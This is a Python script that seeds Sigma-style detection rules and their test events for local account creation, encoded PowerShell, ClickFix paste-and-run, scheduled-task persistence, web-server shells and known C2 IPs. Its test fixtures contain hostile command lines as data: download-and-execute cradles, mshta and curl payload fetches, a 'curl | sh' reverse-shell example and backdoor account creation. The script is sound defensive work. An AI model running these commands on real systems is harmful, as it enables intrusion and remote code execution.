"""Write the bundled example rule set.

Kept as a script rather than a pile of hand-managed files so the rules and their
test suites stay side by side while they are being written — a rule and its
negatives are one thought, and splitting them across a directory tree while
drafting is how the negatives end up never getting written.

Run: python scripts/seed_rules.py
"""

from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent / "rules"

FILES = {}

# --- T1136.001 local account creation --------------------------------------

FILES["windows/local_account_created_net.yml"] = r"""
title: Local Account Created via net.exe
id: 6b1e0a54-2c9e-4b7a-9a1f-0f2b1c4d5e01
status: experimental
description: >
  Detects local account creation using net.exe or net1.exe. Attackers add an
  account after gaining execution so they retain access that survives the
  original foothold being cleaned up.
references:
  - https://attack.mitre.org/techniques/T1136/001/
author: Benjamin Choe
date: 2026-08-25
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    EventID: 4688
    Image|endswith:
      - '\net.exe'
      - '\net1.exe'
    CommandLine|contains|all:
      - ' user '
      - ' /add'
  condition: selection
falsepositives:
  - Helpdesk provisioning a local account on a workstation
  - Imaging or build automation that seeds a local administrator
level: medium
tags:
  - attack.persistence
  - attack.t1136.001
"""

FILES["windows/local_account_created_net.test.yml"] = r"""
true_positives:
  - name: backdoor account added with net.exe
    event:
      EventID: 4688
      Image: 'C:\Windows\System32\net.exe'
      CommandLine: 'net user svc_backup P@ssw0rd123 /add'
  - name: net1.exe variant used to evade a name-only rule
    event:
      EventID: 4688
      Image: 'C:\Windows\System32\net1.exe'
      CommandLine: 'net1 user attacker Passw0rd! /add'
  - name: mixed case and full path
    event:
      EventID: 4688
      Image: 'C:\Windows\SysWOW64\NET.EXE'
      CommandLine: 'NET USER helper Winter2026 /ADD'

true_negatives:
  - name: enumerating accounts, not creating one
    event:
      EventID: 4688
      Image: 'C:\Windows\System32\net.exe'
      CommandLine: 'net user'
  - name: querying one account - contains ' user ' but no /add
    event:
      EventID: 4688
      Image: 'C:\Windows\System32\net.exe'
      CommandLine: 'net user alice /domain'
  - name: adding a group, not a user
    event:
      EventID: 4688
      Image: 'C:\Windows\System32\net.exe'
      CommandLine: 'net localgroup Developers /add'
  - name: net use drive mapping mentions neither user nor add
    event:
      EventID: 4688
      Image: 'C:\Windows\System32\net.exe'
      CommandLine: 'net use Z: \\fileserver\share'
  - name: unrelated binary with a similar command line
    event:
      EventID: 4688
      Image: 'C:\Tools\inventory.exe'
      CommandLine: 'inventory.exe --report user /add'
  - name: process creation event from a different channel
    event:
      EventID: 4624
      Image: 'C:\Windows\System32\net.exe'
      CommandLine: 'net user svc /add'
"""

# --- T1059.001 encoded PowerShell ------------------------------------------

FILES["windows/powershell_encoded_command.yml"] = r"""
title: PowerShell Encoded Command
id: 6b1e0a54-2c9e-4b7a-9a1f-0f2b1c4d5e02
status: experimental
description: >
  Detects PowerShell invoked with a base64-encoded command block. Encoding is
  used to carry a payload past command-line inspection and to survive quoting
  when the command is delivered through a lure, a scheduled task, or a service.
references:
  - https://attack.mitre.org/techniques/T1059/001/
author: Benjamin Choe
date: 2026-08-25
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    EventID: 4688
    Image|endswith:
      - '\powershell.exe'
      - '\pwsh.exe'
  encoded_flag:
    CommandLine|contains:
      - ' -enc '
      - ' -encodedcommand '
      - ' -ec '
      - ' /enc '
  condition: selection and encoded_flag
falsepositives:
  - Configuration management tools that wrap scripts in encoded commands
  - Some vendor installers invoke encoded PowerShell during setup
level: high
tags:
  - attack.execution
  - attack.defense_evasion
  - attack.t1059.001
"""

FILES["windows/powershell_encoded_command.test.yml"] = r"""
true_positives:
  - name: classic -enc payload
    event:
      EventID: 4688
      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
      CommandLine: 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0A'
  - name: fully spelled -EncodedCommand
    event:
      EventID: 4688
      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
      CommandLine: 'powershell -NoProfile -EncodedCommand SQBFAFgA'
  - name: pwsh 7 with the short -ec form
    event:
      EventID: 4688
      Image: 'C:\Program Files\PowerShell\7\pwsh.exe'
      CommandLine: 'pwsh -ec SQBFAFgAIAA='

true_negatives:
  - name: ordinary script execution
    event:
      EventID: 4688
      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
      CommandLine: 'powershell.exe -File C:\Scripts\inventory.ps1'
  - name: -Encoding is a different parameter and must not trip the rule
    event:
      EventID: 4688
      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
      CommandLine: 'powershell.exe -Command Get-Content log.txt -Encoding utf8'
  - name: the word encoded appearing inside a file path
    event:
      EventID: 4688
      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
      CommandLine: 'powershell.exe -File C:\data\encoded\report.ps1'
  - name: a different interpreter entirely
    event:
      EventID: 4688
      Image: 'C:\Windows\System32\cmd.exe'
      CommandLine: 'cmd.exe /c app.exe -enc payload'
"""

# --- T1204.004 ClickFix / paste-and-run -------------------------------------

FILES["windows/clickfix_run_dialog_execution.yml"] = r"""
title: ClickFix Paste-and-Run via Windows Run Dialog
id: 6b1e0a54-2c9e-4b7a-9a1f-0f2b1c4d5e03
status: experimental
description: >
  Detects a scripting interpreter launched directly by explorer.exe with a
  download-and-execute command line. This is the ClickFix pattern: a web page
  tells the visitor to paste a prepared command into the Run dialog, so the
  parent process is the shell itself rather than a browser or Office.
  SmartApeSG, ClearFake and FAKEUPDATES all deliver this way.
references:
  - https://attack.mitre.org/techniques/T1204/004/
author: Benjamin Choe
date: 2026-08-25
logsource:
  product: windows
  category: process_creation
detection:
  selection_parent:
    EventID: 4688
    ParentImage|endswith: '\explorer.exe'
    Image|endswith:
      - '\powershell.exe'
      - '\pwsh.exe'
      - '\mshta.exe'
      - '\cmd.exe'
      - '\curl.exe'
  selection_fetch:
    CommandLine|contains:
      - 'http://'
      - 'https://'
      - 'iwr '
      - 'invoke-webrequest'
      - 'downloadstring'
      - 'bitsadmin'
  condition: selection_parent and selection_fetch
falsepositives:
  - An administrator pasting a documented install one-liner into the Run dialog
  - Vendor documentation that instructs users to run a curl command
level: high
tags:
  - attack.execution
  - attack.initial_access
  - attack.t1204.004
"""

FILES["windows/clickfix_run_dialog_execution.test.yml"] = r"""
true_positives:
  - name: mshta fetching a remote payload from the Run dialog
    event:
      EventID: 4688
      ParentImage: 'C:\Windows\explorer.exe'
      Image: 'C:\Windows\System32\mshta.exe'
      CommandLine: 'mshta https://cdn.example.invalid/verify.hta'
  - name: powershell download cradle pasted by the user
    event:
      EventID: 4688
      ParentImage: 'C:\Windows\explorer.exe'
      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
      CommandLine: "powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.20/a')"
  - name: curl one-liner in the Run box
    event:
      EventID: 4688
      ParentImage: 'C:\Windows\explorer.exe'
      Image: 'C:\Windows\System32\curl.exe'
      CommandLine: 'curl.exe -o %TEMP%\u.exe http://203.0.113.9/update.exe'

true_negatives:
  - name: same command line but launched by a build agent, not the shell
    event:
      EventID: 4688
      ParentImage: 'C:\agent\worker.exe'
      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
      CommandLine: "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://build.internal/x')"
  - name: user opens a plain shell from the Run dialog with no fetch
    event:
      EventID: 4688
      ParentImage: 'C:\Windows\explorer.exe'
      Image: 'C:\Windows\System32\cmd.exe'
      CommandLine: 'cmd.exe'
  - name: explorer launching a normal application
    event:
      EventID: 4688
      ParentImage: 'C:\Windows\explorer.exe'
      Image: 'C:\Program Files\Notepad++\notepad++.exe'
      CommandLine: 'notepad++.exe C:\notes\todo.txt'
  - name: browser child process, which is a different delivery chain
    event:
      EventID: 4688
      ParentImage: 'C:\Program Files\Google\Chrome\Application\chrome.exe'
      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
      CommandLine: 'powershell -c iwr http://example.invalid/x'
"""

# --- T1053.005 scheduled task persistence -----------------------------------

FILES["windows/scheduled_task_persistence.yml"] = r"""
title: Scheduled Task Created from a User-Writable Path
id: 6b1e0a54-2c9e-4b7a-9a1f-0f2b1c4d5e04
status: experimental
description: >
  Detects schtasks.exe creating a task whose action points at a user-writable
  directory. Scheduled tasks are the most common way commodity malware survives
  a reboot, and the give-away is not the task itself but that it runs something
  out of Temp, AppData or the public profile.
references:
  - https://attack.mitre.org/techniques/T1053/005/
author: Benjamin Choe
date: 2026-08-25
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    EventID: 4688
    Image|endswith: '\schtasks.exe'
    CommandLine|contains: ' /create'
  suspicious_path:
    CommandLine|contains:
      - '\AppData\'
      - '\Temp\'
      - '\Users\Public\'
      - '\ProgramData\'
  condition: selection and suspicious_path
falsepositives:
  - Software updaters that stage a helper binary in ProgramData
level: high
tags:
  - attack.persistence
  - attack.t1053.005
"""

FILES["windows/scheduled_task_persistence.test.yml"] = r"""
true_positives:
  - name: task launching a binary from AppData
    event:
      EventID: 4688
      Image: 'C:\Windows\System32\schtasks.exe'
      CommandLine: 'schtasks /create /sc minute /mo 10 /tn Updater /tr C:\Users\alice\AppData\Roaming\svc.exe'
  - name: task launching from the public profile
    event:
      EventID: 4688
      Image: 'C:\Windows\System32\schtasks.exe'
      CommandLine: 'schtasks /Create /TN Sync /TR "C:\Users\Public\sync.vbs" /SC ONLOGON'

true_negatives:
  - name: task pointing at a signed binary in System32
    event:
      EventID: 4688
      Image: 'C:\Windows\System32\schtasks.exe'
      CommandLine: 'schtasks /create /tn Defrag /tr C:\Windows\System32\defrag.exe /sc weekly'
  - name: querying tasks rather than creating one
    event:
      EventID: 4688
      Image: 'C:\Windows\System32\schtasks.exe'
      CommandLine: 'schtasks /query /fo LIST'
  - name: deleting a task that lives in AppData
    event:
      EventID: 4688
      Image: 'C:\Windows\System32\schtasks.exe'
      CommandLine: 'schtasks /delete /tn AppDataTask /f'
"""

# --- T1505.003 web shell ----------------------------------------------------

FILES["linux/webserver_spawns_shell.yml"] = r"""
title: Web Server Process Spawns a Shell
id: 6b1e0a54-2c9e-4b7a-9a1f-0f2b1c4d5e05
status: experimental
description: >
  Detects a web or mail server process spawning an interactive shell. A web
  server has no legitimate reason to execute /bin/sh; when it does, the request
  that caused it generally carried the command. This is the observable end of
  the unauthenticated command-injection bugs that dominate KEV — Zimbra
  CVE-2026-73570 lands exactly here.
references:
  - https://attack.mitre.org/techniques/T1505/003/
author: Benjamin Choe
date: 2026-08-25
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    ParentImage|endswith:
      - '/httpd'
      - '/apache2'
      - '/nginx'
      - '/php-fpm'
      - '/java'
      - '/zmmailboxdctl'
    Image|endswith:
      - '/sh'
      - '/bash'
      - '/dash'
      - '/zsh'
  filter_healthcheck:
    CommandLine|contains:
      - 'healthcheck'
      - 'logrotate'
  condition: selection and not filter_healthcheck
falsepositives:
  - CGI applications that legitimately shell out
  - Container entrypoints that wrap the server in a shell
level: critical
tags:
  - attack.persistence
  - attack.initial_access
  - attack.t1505.003
"""

FILES["linux/webserver_spawns_shell.test.yml"] = r"""
true_positives:
  - name: nginx spawning a reverse shell
    event:
      ParentImage: '/usr/sbin/nginx'
      Image: '/bin/sh'
      CommandLine: 'sh -c curl http://198.51.100.7/s | sh'
  - name: java application server spawning bash
    event:
      ParentImage: '/usr/lib/jvm/java-17/bin/java'
      Image: '/bin/bash'
      CommandLine: 'bash -i'
  - name: zimbra mailbox process spawning a shell
    event:
      ParentImage: '/opt/zimbra/bin/zmmailboxdctl'
      Image: '/bin/sh'
      CommandLine: 'sh -c id'

true_negatives:
  - name: a shell spawned by systemd, not by the web server
    event:
      ParentImage: '/usr/lib/systemd/systemd'
      Image: '/bin/bash'
      CommandLine: 'bash /opt/app/start.sh'
  - name: nginx running its own healthcheck wrapper
    event:
      ParentImage: '/usr/sbin/nginx'
      Image: '/bin/sh'
      CommandLine: 'sh -c /usr/local/bin/healthcheck.sh'
  - name: web server spawning a non-shell helper
    event:
      ParentImage: '/usr/sbin/apache2'
      Image: '/usr/bin/convert'
      CommandLine: 'convert upload.png thumb.png'
  - name: an administrator shell from sshd
    event:
      ParentImage: '/usr/sbin/sshd'
      Image: '/bin/bash'
      CommandLine: '-bash'
"""

# --- T1071.001 C2 beacon over HTTP ------------------------------------------

FILES["network/c2_beacon_known_infrastructure.yml"] = r"""
title: Outbound Connection to Known C2 Infrastructure
id: 6b1e0a54-2c9e-4b7a-9a1f-0f2b1c4d5e06
status: experimental
description: >
  Detects an outbound connection to command-and-control infrastructure observed
  in the threat-intel pipeline for 2026-W35 (Cobalt Strike and AsyncRAT
  listeners published via ThreatFox). Indicator rules like this one age out
  quickly; the point of pinning it with tests is that the rule keeps evaluating
  correctly as the indicator list is edited.
references:
  - https://attack.mitre.org/techniques/T1071/001/
  - https://github.com/benjaminchoe123/threat-intel-pipeline/blob/main/vault/reports/2026-W35.md
author: Benjamin Choe
date: 2026-08-25
logsource:
  category: network_connection
detection:
  selection:
    DestinationIp:
      - '38.147.185.54'
      - '177.3.89.54'
      - '182.92.78.7'
      - '80.190.77.86'
      - '50.116.42.10'
  filter_internal:
    DestinationIp|startswith:
      - '10.'
      - '192.168.'
  condition: selection and not filter_internal
falsepositives:
  - Indicator reuse after the host is reassigned to a legitimate tenant
  - Security tooling deliberately probing known-bad infrastructure
level: critical
tags:
  - attack.command_and_control
  - attack.t1071.001
"""

FILES["network/c2_beacon_known_infrastructure.test.yml"] = r"""
true_positives:
  - name: beacon to a Cobalt Strike listener
    event:
      DestinationIp: '38.147.185.54'
      DestinationPort: 443
      Image: 'C:\Windows\System32\rundll32.exe'
  - name: beacon to an AsyncRAT listener on a high port
    event:
      DestinationIp: '80.190.77.86'
      DestinationPort: 30700
      Image: 'C:\Users\bob\AppData\Roaming\svc.exe'

true_negatives:
  - name: ordinary outbound traffic
    event:
      DestinationIp: '140.82.121.4'
      DestinationPort: 443
      Image: 'C:\Program Files\Git\bin\git.exe'
  - name: an internal address that merely starts with the same octets
    event:
      DestinationIp: '10.38.147.185'
      DestinationPort: 445
      Image: 'C:\Windows\System32\svchost.exe'
  - name: near-miss address one octet different from an indicator
    event:
      DestinationIp: '38.147.185.55'
      DestinationPort: 443
      Image: 'C:\Windows\System32\svchost.exe'
"""


def main():
    for relative, content in FILES.items():
        path = ROOT / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content.lstrip("\n"), encoding="utf-8")
        print(f"wrote {path.relative_to(ROOT.parent)}")
    print(f"\n{len(FILES)} files, {len(FILES) // 2} rules")


if __name__ == "__main__":
    main()
